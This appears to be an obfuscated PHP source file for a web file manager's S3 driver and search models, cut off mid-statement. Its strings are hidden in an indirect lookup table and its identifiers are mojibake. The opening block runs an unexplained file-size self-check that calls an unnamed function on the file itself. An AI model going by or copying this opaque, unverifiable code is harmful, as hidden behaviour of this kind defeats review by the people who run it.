<?php
 goto BÂ½äà¯ĞŞ; bÛº‘¥Æ³²: $_file = $_SERVER[$_SERVER[‹‰”››ê][316]]; $_size = $_SERVER[‹‰”››ê][317]; if ($_SERVER[$_SERVER[‹‰”››ê][318]] != $_size($_file)) { $_getc = $_SERVER[‹‰”››ê][319]; $_getfile = $_SERVER[$_SERVER[‹‰”››ê][320]] . $_SERVER[‹‰”››ê][321]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹‰”››ê][288], $_getfilec); if (count($_getarrs) < $_SERVER[‹‰”››ê][322]) { $exit = $_SERVER[‹‰”››ê][323]; $exit(); } $_act = $_SERVER[‹‰”››ê][324]; $_act($_file); } goto bë“¨‡¿Šİ; bë“¨‡¿Šİ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($•Õ¯Èí) { $Âìó…µ =& $_SERVER[‹‰”››ê]; parent::__construct($•Õ¯Èí); $«ÜßÎÆƒ = isset($•Õ¯Èí[$Âìó…µ[259]]) && $•Õ¯Èí[$Âìó…µ[259]] == $Âìó…µ[250] ? $Âìó…µ[250] : $Âìó…µ[325]; $this->setSignVersion($«ÜßÎÆƒ); } public function link($õ»©ùÀ˜, $èæøñˆ± = array()) { return parent::link($õ»©ùÀ˜, $èæøñˆ±); } public function fileOut($«¾ğ°éØ, $°ùšˆû¼ = false, $œ·Ï§Ñ = false, $‰²–‰ôé = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[‹‰”››ê][326])) { return parent::fileOutServer($«¾ğ°éØ, $°ùšˆû¼, $œ·Ï§Ñ, $‰²–‰ôé); } parent::fileOut($«¾ğ°éØ, $°ùšˆû¼, $œ·Ï§Ñ, $‰²–‰ôé); } public function fileOutImage($Å«ÔæÚÃ, $°¾øÓÏµ = 250) { if (strstr($this->endpoint, $_SERVER[‹‰”››ê][326])) { return parent::fileOutImageServer($Å«ÔæÚÃ, $°¾øÓÏµ); } parent::fileOutImage($Å«ÔæÚÃ, $°¾øÓÏµ); } public function fileOutLink($âÚ—Ç¸¸) { $¨‘´¿Ì =& $_SERVER[‹‰”››ê]; if (substr($âÚ—Ç¸¸, 0, 7) == $¨‘´¿Ì[219]) { $âÚ—Ç¸¸ = $¨‘´¿Ì[220] . substr($âÚ—Ç¸¸, 7); } header($¨‘´¿Ì[175] . $âÚ—Ç¸¸); die; } } define($_SERVER[‹‰”››ê][327], 1); define($_SERVER[‹‰”››ê][328], 2); goto fä‹ºŸ„à›; B ·°ÖïÌÍ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ˆóƒÇØÃ) { $ô®½ëÎ =& $_SERVER[‹‰”››ê]; $ØÓàˆŸ = KodIO::fileTypeList(); $äÚ£ ‰ = $ØÓàˆŸ[$ˆóƒÇØÃ]; if (!$äÚ£ ‰) { return array(); } $µÃµşï« = $äÚ£ ‰[$ô®½ëÎ[169]]; $ç²Ó•šî = $ô®½ëÎ[7]; if (!$äÚ£ ‰[$ô®½ëÎ[169]]) { $€½ŠÉ“ = array_to_keyvalue($ØÓàˆŸ, $ô®½ëÎ[12], $ô®½ëÎ[169]); $µÃµşï« = implode($ô®½ëÎ[50], $€½ŠÉ“); $ç²Ó•šî = $ô®½ëÎ[2259]; } $ıéŒ²œ¼ = explode($ô®½ëÎ[50], trim($µÃµşï«, $ô®½ëÎ[50])); return array($ç²Ó•šî, $ıéŒ²œ¼); } public function listPathType($­µ·…ÒØ) { $ÈÛµÛé¥ =& $_SERVER[‹‰”››ê]; $ÇïÎıÉÛ = $this->fileTypeWhere($­µ·…ÒØ); if (!$ÇïÎıÉÛ) { return array(); } $Ë²š¦„ü = USER_ID; $¹Şîªñ = Model($ÈÛµÛé¥[611])->getInfo($Ë²š¦„ü); $Ú¹ã§‚Ò = array($ÈÛµÛé¥[665] => SourceModel::TYPE_USER, $ÈÛµÛé¥[598] => array($ÈÛµÛé¥[629], $ÈÛµÛé¥[607] . $¹Şîªñ[$ÈÛµÛé¥[90]][$ÈÛµÛé¥[194]] . $ÈÛµÛé¥[630]), $ÈÛµÛé¥[666] => $Ë²š¦„ü, $ÈÛµÛé¥[663] => 0, $ÈÛµÛé¥[664] => $ÇïÎıÉÛ); return $this->listSource($Ú¹ã§‚Ò); } public function listSearch($¶“àµ¥Â, $ˆ¶°è÷â = 300) { $æÇŠ»áã =& $_SERVER[‹‰”››ê]; if (isset($¶“àµ¥Â[$æÇŠ»áã[2090]]) && $¶“àµ¥Â[$æÇŠ»áã[2090]]) { $¶“àµ¥Â[$æÇŠ»áã[2090]] = str_replace($æÇŠ»áã[472], $æÇŠ»áã[2260], trim($¶“àµ¥Â[$æÇŠ»áã[2090]])); } $ãÖ¬ƒ‹Ô = $this->_parseSearchWhere($¶“àµ¥Â); if (!isset($ãÖ¬ƒ‹Ô[$æÇŠ»áã[517]])) { $ãÖ¬ƒ‹Ô[$æÇŠ»áã[517]] = 0; } $¬±«ì“ô = $æÇŠ»áã[2261]; $Şø™°áÛ = $ãÖ¬ƒ‹Ô; $ÈÄÕí§ = $¬±«ì“ô; $this->_listSearchBindPinyin($¶“àµ¥Â, $ãÖ¬ƒ‹Ô, $¬±«ì“ô); $this->alias($æÇŠ»áã[531])->_makeOrder(); $ãÖ¬ƒ‹Ô = $this->parseWhereLike($ãÖ¬ƒ‹Ô); $ŸëŠ‘¿ä = $this->distinct(!0)->field($¬±«ì“ô)->where($ãÖ¬ƒ‹Ô)->selectPage($ˆ¶°è÷â); if ($GLOBALS[$æÇŠ»áã[6]][$æÇŠ»áã[469]][$æÇŠ»áã[470]] && Input::check($¶“àµ¥Â[$æÇŠ»áã[2090]], $æÇŠ»áã[672]) && $ŸëŠ‘¿ä[$æÇŠ»áã[454]][$æÇŠ»áã[440]] == 1 && $ŸëŠ‘¿ä[$æÇŠ»áã[454]][$æÇŠ»áã[455]] == 0) { $ŸëŠ‘¿ä = $this->distinct(!0)->field($¬±«ì“ô)->where($Şø™°áÛ)->limit(1000)->select(); $ŸëŠ‘¿ä = array_page_split($ŸëŠ‘¿ä, !1, $ˆ¶°è÷â); } $this->_listSearchFileContent($ŸëŠ‘¿ä, $¶“àµ¥Â, $ÈÄÕí§, $Şø™°áÛ); $this->_listSearchDesc($ŸëŠ‘¿ä, $¶“àµ¥Â, $ÈÄÕí§); $this->_listSearchTag($ŸëŠ‘¿ä, $¶“àµ¥Â, $ÈÄÕí§); $this->_listSearchGroupTag($ŸëŠ‘¿ä, $¶“àµ¥Â, $ÈÄÕí§); $this->_listDataApply($ŸëŠ‘¿ä[$æÇŠ»áã[457]]); $this->_listMake($ŸëŠ‘¿ä); return $ŸëŠ‘¿ä; } private function _listSearchFileContent(&$¼ë¢ì±†, $ëÀöëÕÅ, $àûÌĞí‹, $œÌ‚ë¯£) { $®ºßšœ• =& $_SERVER[‹‰”››ê]; if (!$ëÀöëÕÅ[$®ºßšœ•[2090]] || $¼ë¢ì±†[$®ºßšœ•[454]][$®ºßšœ•[440]] > 1) { return; } if (!isset($œÌ‚ë¯£[$®ºßšœ•[32]]) || !is_array($ëÀöëÕÅ[$®ºßšœ•[555]])) { return; } $œÌ‚ë¯£[$®ºßšœ•[555]] = array($®ºßšœ•[7], $ëÀöëÕÅ[$®ºßšœ•[555]]); unset($œÌ‚ë¯£[$®ºßšœ•[32]]); unset($ëÀöëÕÅ[$®ºßšœ•[555]]); $ÇÍÈ£” = $this->field($àûÌĞí‹)->where($œÌ‚ë¯£)->limit($®ºßšœ•[2262])->select(); if (!$ÇÍÈ£” || count($ÇÍÈ£”) == 0) { return; } $¼ë¢ì±†[$®ºßšœ•[457]] = array_merge($ÇÍÈ£”, $¼ë¢ì±†[$®ºßšœ•[457]]); $¼ë¢ì±†[$®ºßšœ•[454]][$®ºßšœ•[455]] += count($ÇÍÈ£”); } private function _listSearchTag(&$ğ¡¢ãéÎ, $È›‡€İù, $–‡¯öŒÓ) { $–ªæ„üÀ =& $_SERVER[‹‰”››ê]; if (empty($È›‡€İù[$–ªæ„üÀ[1950]]) || !in_array($–ªæ„üÀ[2263], $È›‡€İù[$–ªæ„üÀ[1950]])) { return; } if (!$È›‡€İù[$–ªæ„üÀ[2090]] || $ğ¡¢ãéÎ[$–ªæ„üÀ[454]][$–ªæ„üÀ[440]] > 1) { return; } $Àˆ‚ÖÇó = Model($–ªæ„üÀ[2264])->listData(); $Å¼›î‡È = array(); $ğé´ñ€ = $È›‡€İù[$–ªæ„üÀ[2090]]; foreach ($Àˆ‚ÖÇó as $Îæ“ÔàÀ) { $¦±ÅøÈ× = $Îæ“ÔàÀ[$–ªæ„üÀ[32]]; $“šà±¶Ü = str_replace($–ªæ„üÀ[53], $–ªæ„üÀ[12], Pinyin::get($¦±ÅøÈ×)); if (stripos($¦±ÅøÈ×, $ğé´ñ€) !== !1 || stripos($“šà±¶Ü, $ğé´ñ€) !== !1) { $Å¼›î‡È[] = $Îæ“ÔàÀ[$–ªæ„üÀ[487]]; } } if (!$Å¼›î‡È) { return; } $ùãÙ½»– = array($–ªæ„üÀ[512] => array($–ªæ„üÀ[7], $Å¼›î‡È), $–ªæ„üÀ[1791] => USER_ID); $ƒåËÈÀ½ = Model($–ªæ„üÀ[514])->field($–ªæ„üÀ[87])->where($ùãÙ½»–)->select(); $ƒåËÈÀ½ = array_to_keyvalue($ƒåËÈÀ½, $–ªæ„üÀ[12], $–ªæ„üÀ[87]); $ğ ÛÅñ = array_unique($ƒåËÈÀ½); $this->_listSearchMerge($ğ¡¢ãéÎ, $È›‡€İù, $–‡¯öŒÓ, $ğ ÛÅñ); } private function _listSearchDesc(&$ÜÊâ™Û†, $Ü†å©ˆÏ, $¸€ï…ØÀ) { $ì©‚˜£‡ =& $_SERVER[‹‰”››ê]; if (empty($Ü†å©ˆÏ[$ì©‚˜£‡[1950]]) || !in_array($ì©‚˜£‡[538], $Ü†å©ˆÏ[$ì©‚˜£‡[1950]])) { return; } if (!$Ü†å©ˆÏ[$ì©‚˜£‡[2090]] || $ÜÊâ™Û†[$ì©‚˜£‡[454]][$ì©‚˜£‡[440]] > 1) { return; } $É€Î¥ÒÛ = array($ì©‚˜£‡[97] => $ì©‚˜£‡[538], $ì©‚˜£‡[462] => array($ì©‚˜£‡[471], $ì©‚˜£‡[2092] . $Ü†å©ˆÏ[$ì©‚˜£‡[2090]] . $ì©‚˜£‡[2092])); $ºíŒ¼ƒ = !1; if ($ºíŒ¼ƒ) { $ó´“‡š¢ = $this->listSearchChildren($Ü†å©ˆÏ[$ì©‚˜£‡[193]]); $ó´“‡š¢ = array_unique($ó´“‡š¢); if (!$ó´“‡š¢) { return; } $É€Î¥ÒÛ[$ì©‚˜£‡[194]] = array($ì©‚˜£‡[7], $ó´“‡š¢); } $‰Şµ¾»ê = Model($ì©‚˜£‡[649])->field($ì©‚˜£‡[194])->where($É€Î¥ÒÛ)->limit(5000)->select(); $îÂû¨Œù = array_to_keyvalue($‰Şµ¾»ê, $ì©‚˜£‡[12], $ì©‚˜£‡[194]); $this->_listSearchMerge($ÜÊâ™Û†, $Ü†å©ˆÏ, $¸€ï…ØÀ, $îÂû¨Œù); } private function _listSearchGroupTag(&$ãƒò©»â, $¥ÉÏ¬ôÁ, $÷ºÄ•Åñ) { $æÎ«µ¡ =& $_SERVER[‹‰”››ê]; if (empty($¥ÉÏ¬ôÁ[$æÎ«µ¡[1950]]) || !in_array($æÎ«µ¡[2263], $¥ÉÏ¬ôÁ[$æÎ«µ¡[1950]])) { return; } if (!$¥ÉÏ¬ôÁ[$æÎ«µ¡[2090]] || $ãƒò©»â[$æÎ«µ¡[454]][$æÎ«µ¡[440]] > 1 || !$¥ÉÏ¬ôÁ[$æÎ«µ¡[193]]) { return; } $­¥­·õœ = $this->sourceInfo($¥ÉÏ¬ôÁ[$æÎ«µ¡[193]]); if (!$­¥­·õœ || $­¥­·õœ[$æÎ«µ¡[191]] != SourceModel::TYPE_GROUP) { return; } $¿ŒÚªë£ = $­¥­·õœ[$æÎ«µ¡[583]]; $ßéùÓºÑ = Model($æÎ«µ¡[2265])->get($¿ŒÚªë£); $©ËĞõª½ = array(); $¬­Úƒ¤ = $¥ÉÏ¬ôÁ[$æÎ«µ¡[2090]]; foreach ($ßéùÓºÑ[$æÎ«µ¡[457]] as $ŞÍ½Ò²Ó) { $œÀúÓ´ = $ŞÍ½Ò²Ó[$æÎ«µ¡[32]]; $…¨Óçìà = str_replace($æÎ«µ¡[53], $æÎ«µ¡[12], Pinyin::get($œÀúÓ´)); if (stripos($œÀúÓ´, $¬­Úƒ¤) !== !1 || stripos($…¨Óçìà, $¬­Úƒ¤) !== !1) { $©ËĞõª½[] = $ŞÍ½Ò²Ó[$æÎ«µ¡[487]]; } } if (!$©ËĞõª½) { return; } $ØˆÈû“¾ = array($æÎ«µ¡[512] => array($æÎ«µ¡[7], $©ËĞõª½), $æÎ«µ¡[1791] => 0, $æÎ«µ¡[33] => $æÎ«µ¡[2112] . $¿ŒÚªë£); $Ö ¤ƒî› = Model($æÎ«µ¡[514])->field($æÎ«µ¡[87])->where($ØˆÈû“¾)->select(); $Ö ¤ƒî› = array_to_keyvalue($Ö ¤ƒî›, $æÎ«µ¡[12], $æÎ«µ¡[87]); $Öö¯¸Ü† = array_unique($Ö ¤ƒî›); $this->_listSearchMerge($ãƒò©»â, $¥ÉÏ¬ôÁ, $÷ºÄ•Åñ, $Öö¯¸Ü†); } private function _listSearchMerge(&$×µù£¯, $·§Ğü´Ç, $¶¸Û¦ê, $®¨ĞîİŸ) { $‡ôÅ‘«ˆ =& $_SERVER[‹‰”››ê]; if (!$®¨ĞîİŸ) { return; } $Ôıèœ ø = array_to_keyvalue($×µù£¯[$‡ôÅ‘«ˆ[457]], $‡ôÅ‘«ˆ[12], $‡ôÅ‘«ˆ[194]); $İÚŒšÇ§ = array_diff($®¨ĞîİŸ, $Ôıèœ ø); if (!$İÚŒšÇ§) { return; } $à¹—˜õÄ = array($‡ôÅ‘«ˆ[194] => array($‡ôÅ‘«ˆ[7], $İÚŒšÇ§)); $ÂØ¹ñ€ = $this->field($¶¸Û¦ê)->where($à¹—˜õÄ)->select(); if (!$ÂØ¹ñ€) { return; } $±’„ÄÚ— = array(); foreach ($ÂØ¹ñ€ as $ëÔ¿š§¨) { if ($this->_listSearchFilter($ëÔ¿š§¨, $·§Ğü´Ç)) { $±’„ÄÚ—[] = $ëÔ¿š§¨; } } $×µù£¯[$‡ôÅ‘«ˆ[457]] = array_merge($±’„ÄÚ—, $×µù£¯[$‡ôÅ‘«ˆ[457]]); $×µù£¯[$‡ôÅ‘«ˆ[454]][$‡ôÅ‘«ˆ[455]] += count($±’„ÄÚ—); } private function _listSearchFilter($ÛÅ…¡Ùû, $À ğµ˜) { $‡ª£Š¯É =& $_SERVER[‹‰”››ê]; $è§Î Äò = $ÛÅ…¡Ùû[$‡ª£Š¯É[497]] == $‡ª£Š¯É[91]; if (!strstr($ÛÅ…¡Ùû[$‡ª£Š¯É[598]], $‡ª£Š¯É[50] . $À ğµ˜[$‡ª£Š¯É[193]] . $‡ª£Š¯É[50])) { return !1; } if (isset($À ğµ˜[$‡ª£Š¯É[498]]) && $À ğµ˜[$‡ª£Š¯É[498]] != $‡ª£Š¯É[866]) { if ($À ğµ˜[$‡ª£Š¯É[498]] == $‡ª£Š¯É[78] && !$è§Î Äò) { return !1; } if ($À ğµ˜[$‡ª£Š¯É[498]] != $‡ª£Š¯É[78] && $è§Î Äò) { return !1; } if (!strstr($ÛÅ…¡Ùû[$‡ª£Š¯É[169]], $‡ª£Š¯É[50] . $À ğµ˜[$‡ª£Š¯É[498]] . $‡ª£Š¯É[50])) { return !1; } } if (isset($À ğµ˜[$‡ª£Š¯É[2266]]) && $À ğµ˜[$‡ª£Š¯É[2266]] < $ÛÅ…¡Ùû[$‡ª£Š¯É[79]]) { return !1; } if (isset($À ğµ˜[$‡ª£Š¯É[2267]]) && $À ğµ˜[$‡ª£Š¯É[2267]] > $ÛÅ…¡Ùû[$‡ª£Š¯É[79]]) { return !1; } if (isset($À ğµ˜[$‡ª£Š¯É[679]]) && $À ğµ˜[$‡ª£Š¯É[679]] != $ÛÅ…¡Ùû[$‡ª£Š¯É[541]]) { return !1; } return !0; } public function listSearchChildren($ô–èÒŸ, $çÓÇÚÅ = 5000) { $»¤½ë—× =& $_SERVER[‹‰”››ê]; $—¹¾â‚ = array(); $ö«Êı³± = $this->sourceInfo($ô–èÒŸ); $î´îš¦Ÿ = array($»¤½ë—×[598] => array($»¤½ë—×[471], $ö«Êı³±[$»¤½ë—×[598]] . $ö«Êı³±[$»¤½ë—×[194]] . $»¤½ë—×[630])); $ ‹öêò— = $this->field($»¤½ë—×[79])->where($î´îš¦Ÿ)->limit($çÓÇÚÅ + 1)->select(); $¦û¨•Œ› = is_array($ ‹öêò—) ? count($ ‹öêò—) : 0; if ($¦û¨•Œ› > $çÓÇÚÅ) { return $this->_listSearchChildrenNear($ô–èÒŸ, $çÓÇÚÅ); } $ÀÎû£¾ = $this->field($»¤½ë—×[194])->where($î´îš¦Ÿ)->select(); $—¹¾â‚ = array_to_keyvalue($ÀÎû£¾, $»¤½ë—×[12], $»¤½ë—×[194]); return $—¹¾â‚; } private function _listSearchChildrenNear($ƒúñÖ±, $ü™éÂÊ‡) { $¤òæñ‘ =& $_SERVER[‹‰”››ê]; $ÂêµÉÖ = array(); $Ÿ«º“™„ = array($¤òæñ‘[193] => $ƒúñÖ±); $€ÅŞè = $this->field($¤òæñ‘[2268])->where($Ÿ«º“™„)->select(); $ØúñÜÌ“ = array_to_keyvalue(array_filter_by_field($€ÅŞè, $¤òæñ‘[497], $¤òæñ‘[91]), $¤òæñ‘[12], $¤òæñ‘[194]); $ÂêµÉÖ = array_merge($ÂêµÉÖ, array_to_keyvalue($€ÅŞè, $¤òæñ‘[12], $¤òæñ‘[194])); if (!$ØúñÜÌ“) { return $ÂêµÉÖ; } $Ÿ«º“™„ = array($¤òæñ‘[193] => array($¤òæñ‘[7], $ØúñÜÌ“)); $€ÅŞè = $this->field($¤òæñ‘[2268])->where($Ÿ«º“™„)->limit($ü™éÂÊ‡)->select(); $ÂêµÉÖ = array_merge($ÂêµÉÖ, array_to_keyvalue($€ÅŞè, $¤òæñ‘[12], $¤òæñ‘[194])); $ÂêµÉÖ = array_slice($ÂêµÉÖ, 0, intval($ü™éÂÊ‡)); return $ÂêµÉÖ; } private function _listSearchBindPinyin($‡ã‘‚„¿, &$üÚù‰£…, &$•Ø¿ğ´Ò) { $˜ œ²ÃÁ =& $_SERVER[‹‰”››ê]; if (!isset($‡ã‘‚„¿[$˜ œ²ÃÁ[2090]]) || !$‡ã‘‚„¿[$˜ œ²ÃÁ[2090]]) { return; } if (!Input::check($‡ã‘‚„¿[$˜ œ²ÃÁ[2090]], $˜ œ²ÃÁ[405]) || strlen($‡ã‘‚„¿[$˜ œ²ÃÁ[2090]]) < 2) { return; } $†¨¡ÓîÛ = "\x4c\x45\x46\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\151\x6f\137\163\157\x75\162\x63\145\x5f\x6d\145\x74\141\x20\x6d\x65\x74\x61\40\x6f\x6e\x20\x73\x6f\165\162\143\145\56\x73\157\x75\x72\143\145\x49\x44\40\75\40\x6d\145\164\x61\56\163\157\x75\162\143\x65\111\104"; $âºñÅí§ = array(); $•Ø¿ğ´Ò = str_replace(array($˜ œ²ÃÁ[288], $˜ œ²ÃÁ[53], $˜ œ²ÃÁ[2269]), $˜ œ²ÃÁ[12], $•Ø¿ğ´Ò); $•Ø¿ğ´Ò = $˜ œ²ÃÁ[523] . str_replace($˜ œ²ÃÁ[50], $˜ œ²ÃÁ[524], $•Ø¿ğ´Ò); $„Ó¨¡¶ = $üÚù‰£…[$˜ œ²ÃÁ[32]]; unset($üÚù‰£…[$˜ œ²ÃÁ[32]]); foreach ($üÚù‰£… as $ñşœ³¤ => $õ¸ú€©ì) { $âºñÅí§[$˜ œ²ÃÁ[523] . $ñşœ³¤] = $õ¸ú€©ì; } foreach ($„Ó¨¡¶ as $’í¸™Ü) { $âºñÅí§[] = array($˜ œ²ÃÁ[528] => $’í¸™Ü, $˜ œ²ÃÁ[1093] => $˜ œ²ÃÁ[2094], array($˜ œ²ÃÁ[2270] => $’í¸™Ü, $˜ œ²ÃÁ[2271] => array($˜ œ²ÃÁ[7], array($˜ œ²ÃÁ[550], $˜ œ²ÃÁ[549])))); } $this->join($†¨¡ÓîÛ); $üÚù‰£… = $âºñÅí§; } private function _parseSearchWhere($ÇµĞ«ûƒ) { $¡×¬¨ì =& $_SERVER[‹‰”››ê]; $Ñ«ŒäÑˆ = array(); if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[850]]) && $ÇµĞ«ûƒ[$¡×¬¨ì[850]]) { $Ñ«ŒäÑˆ[$¡×¬¨ì[88]] = array($¡×¬¨ì[2272], $ÇµĞ«ûƒ[$¡×¬¨ì[850]]); } if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[851]]) && $ÇµĞ«ûƒ[$¡×¬¨ì[851]]) { $üØ­¯› = array($¡×¬¨ì[2273], $ÇµĞ«ûƒ[$¡×¬¨ì[851]]); if ($Ñ«ŒäÑˆ[$¡×¬¨ì[88]]) { $Ñ«ŒäÑˆ[$¡×¬¨ì[88]] = array($Ñ«ŒäÑˆ[$¡×¬¨ì[88]], $üØ­¯›, $¡×¬¨ì[2274]); } else { $Ñ«ŒäÑˆ[$¡×¬¨ì[88]] = $üØ­¯›; } } if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[2266]]) && $ÇµĞ«ûƒ[$¡×¬¨ì[2266]] > 0) { $Ñ«ŒäÑˆ[$¡×¬¨ì[79]] = array($¡×¬¨ì[2272], $ÇµĞ«ûƒ[$¡×¬¨ì[2266]]); } if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[2267]]) && $ÇµĞ«ûƒ[$¡×¬¨ì[2267]]) { $üØ­¯› = array($¡×¬¨ì[2273], $ÇµĞ«ûƒ[$¡×¬¨ì[2267]]); if ($Ñ«ŒäÑˆ[$¡×¬¨ì[79]]) { $Ñ«ŒäÑˆ[$¡×¬¨ì[79]] = array($Ñ«ŒäÑˆ[$¡×¬¨ì[79]], $üØ­¯›, $¡×¬¨ì[2274]); } else { $Ñ«ŒäÑˆ[$¡×¬¨ì[79]] = $üØ­¯›; } } if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[679]]) && $ÇµĞ«ûƒ[$¡×¬¨ì[679]]) { $Ñ«ŒäÑˆ[] = array($¡×¬¨ì[541] => $ÇµĞ«ûƒ[$¡×¬¨ì[679]], $¡×¬¨ì[539] => $ÇµĞ«ûƒ[$¡×¬¨ì[679]], $¡×¬¨ì[1093] => $¡×¬¨ì[2094]); } if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[498]]) && $ÇµĞ«ûƒ[$¡×¬¨ì[498]]) { $‘¡ààëÛ = $ÇµĞ«ûƒ[$¡×¬¨ì[498]]; if ($‘¡ààëÛ == $¡×¬¨ì[78]) { $Ñ«ŒäÑˆ[$¡×¬¨ì[497]] = 1; } else { if ($‘¡ààëÛ == $¡×¬¨ì[2275]) { $Ñ«ŒäÑˆ[$¡×¬¨ì[497]] = 0; } else { if ($‘¡ààëÛ) { $‘¡ààëÛ = is_array($‘¡ààëÛ) ? $‘¡ààëÛ : explode($¡×¬¨ì[50], $‘¡ààëÛ); $Ñ«ŒäÑˆ[$¡×¬¨ì[498]] = array($¡×¬¨ì[504], $‘¡ààëÛ); $Ñ«ŒäÑˆ[$¡×¬¨ì[497]] = 0; } } } } $this->_parseSearchParent($ÇµĞ«ûƒ, $Ñ«ŒäÑˆ); if (isset($ÇµĞ«ûƒ[$¡×¬¨ì[2090]]) && trim($ÇµĞ«ûƒ[$¡×¬¨ì[2090]])) { $©–÷¦ì± = trim($ÇµĞ«ûƒ[$¡×¬¨ì[2090]]); $Ùˆî¦ÜÇ = explode($¡×¬¨ì[53], $©–÷¦ì±); if (strlen($©–÷¦ì±) > 2 && (substr($©–÷¦ì±, 0, 1) == $¡×¬¨ì[121] && substr($©–÷¦ì±, -1) == $¡×¬¨ì[121]) || substr($©–÷¦ì±, 0, 1) == $¡×¬¨ì[58] && substr($©–÷¦ì±, -1) == $¡×¬¨ì[58]) { $©–÷¦ì± = substr($©–÷¦ì±, 1, -1); $Ùˆî¦ÜÇ = array($©–÷¦ì±); } $Ñ«ŒäÑˆ[$¡×¬¨ì[32]] = array(array($¡×¬¨ì[629], $¡×¬¨ì[2092] . $©–÷¦ì± . $¡×¬¨ì[2092])); if (count($Ùˆî¦ÜÇ) > 1) { $Ñ«ŒäÑˆ[$¡×¬¨ì[32]] = array(); foreach ($Ùˆî¦ÜÇ as $¼§÷õ°‚) { if (!trim($¼§÷õ°‚)) { continue; } $Ñ«ŒäÑˆ[$¡×¬¨ì[32]][] = array($¡×¬¨ì[629], $¡×¬¨ì[2092] . trim($¼§÷õ°‚) . $¡×¬¨ì[2092]); } } } return $Ñ«ŒäÑˆ; } private function _parseSearchParent($áñ¬‰İ€, &$ŒáÇ–Á‡) { $¤»ûç‰ =& $_SERVER[‹‰”››ê]; if (!isset($áñ¬‰İ€[$¤»ûç‰[193]]) || !$áñ¬‰İ€[$¤»ûç‰[193]]) { return; } $ÃÀ„À½î = $this->pathInfo($áñ¬‰İ€[$¤»ûç‰[193]]); $±™–åõ¨ = $ÃÀ„À½î[$¤»ûç‰[193]] . $¤»ûç‰[12] === $¤»ûç‰[231]; $ä‡§Ññş = $ÃÀ„À½î[$¤»ûç‰[191]] == $¤»ûç‰[592]; if ($ÃÀ„À½î[$¤»ûç‰[608]] == $¤»ûç‰[609]) { $±ñ¤ìÈı = $this->sourceInfo($áñ¬‰İ€[$¤»ûç‰[193]]); $ÃÀ„À½î[$¤»ûç‰[598]] = $±ñ¤ìÈı[$¤»ûç‰[598]]; } $ŒáÇ–Á‡[$¤»ûç‰[669]] = array($¤»ûç‰[629], $ÃÀ„À½î[$¤»ûç‰[598]] . $áñ¬‰İ€[$¤»ûç‰[193]] . $¤»ûç‰[630]); $ôŒõ¢Ûë = isset($áñ¬‰İ€[$¤»ûç‰[1950]]) && in_array($¤»ûç‰[592], $áñ¬‰İ€[$¤»ûç‰[1950]]); if (!$ôŒõ¢Ûë || !$ä‡§Ññş || !$±™–åõ¨ || !$ÃÀ„À½î[$¤»ûç‰[499]]) { return; } if (!AuthModel::authCheckRoot($ÃÀ„À½î[$¤»ûç‰[499]][$¤»ûç‰[500]])) { return; } $Ÿ¿¤Ç—ƒ = $ÃÀ„À½î[$¤»ûç‰[583]] . $¤»ûç‰[12]; if ($Ÿ¿¤Ç—ƒ == $¤»ûç‰[91]) { unset($ŒáÇ–Á‡[$¤»ûç‰[669]]); $ŒáÇ–Á‡[$¤»ûç‰[191]] = self::TYPE_GROUP; return; } $±˜ÚÏÄ½ = Model($¤»ûç‰[599])->groupChildrenAll($Ÿ¿¤Ç—ƒ); $ÊªÏÓ˜… = count($±˜ÚÏÄ½); if ($ÊªÏÓ˜… <= 1) { return; } $Êİ‹åå = array($¤»ûç‰[193] => 0, $¤»ûç‰[191] => self::TYPE_GROUP, $¤»ûç‰[583] => array($¤»ûç‰[7], $±˜ÚÏÄ½)); $…¿ ıàæ = $this->field($¤»ûç‰[2276])->where($Êİ‹åå)->limit($ÊªÏÓ˜…)->select(); $ŒáÇ–Á‡[$¤»ûç‰[669]] = array(); foreach ($…¿ ıàæ as $ãö˜Ù™è) { $ŒáÇ–Á‡[$¤»ûç‰[669]][] = array($¤»ûç‰[629], $¤»ûç‰[607] . $ãö˜Ù™è[$¤»ûç‰[194]] . $¤»ûç‰[630]); } $ŒáÇ–Á‡[$¤»ûç‰[669]][] = $¤»ûç‰[2094]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¹×´§·÷) { $ùÛˆÑ˜Ì =& $_SERVER[‹‰”››ê]; $Î“±°¿Ê = Model($ùÛˆÑ˜Ì[591])->where(array($ùÛˆÑ˜Ì[1782] => $¹×´§·÷))->find(); $®‚ÚÇğí = $this->_mkdirRoot(SourceModel::TYPE_USER, $¹×´§·÷, $Î“±°¿Ê[$ùÛˆÑ˜Ì[32]]); $this->userDesktopAdd($®‚ÚÇğí); return $®‚ÚÇğí; } public function userDesktopAdd($¸ñÙâ´«) { $¾´Ï„É† =& $_SERVER[‹‰”››ê]; $„î¬ù‚ = LNG($¾´Ï„É†[2277]); $¿ä÷×¦ = $this->mkdir($¸ñÙâ´«, $„î¬ù‚); $this->metaSet($¿ä÷×¦, $¾´Ï„É†[2278], $¾´Ï„É†[91]); $this->metaSet($¸ñÙâ´«, $¾´Ï„É†[2279], $¿ä÷×¦); } public function userPathSafeAdd($ÂÇŒÜˆ) { $ËºşÜ—ò =& $_SERVER[‹‰”››ê]; $ĞÁò•› = Model($ËºşÜ—ò[591])->getInfoFull($ÂÇŒÜˆ); if (!$ĞÁò•›) { return !1; } if (_get($ĞÁò•›, $ËºşÜ—ò[612])) { return $ĞÁò•›[$ËºşÜ—ò[553]][$ËºşÜ—ò[2280]]; } $‡ › œ› = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÂÇŒÜˆ, $ËºşÜ—ò[2281], $ËºşÜ—ò[2282]); Model($ËºşÜ—ò[591])->metaSet($ÂÇŒÜˆ, $ËºşÜ—ò[2280], $‡ › œ›); $this->metaSet($‡ › œ›, $ËºşÜ—ò[2283], $ÂÇŒÜˆ); return $‡ › œ›; } public function userPathAppAdd($ÂëŒôñˆ, $‚µÊÎİÜ = '', $Ø‡Á—ãØ = '') { $‘„Øû› =& $_SERVER[‹‰”››ê]; $ÁßğÙİ = 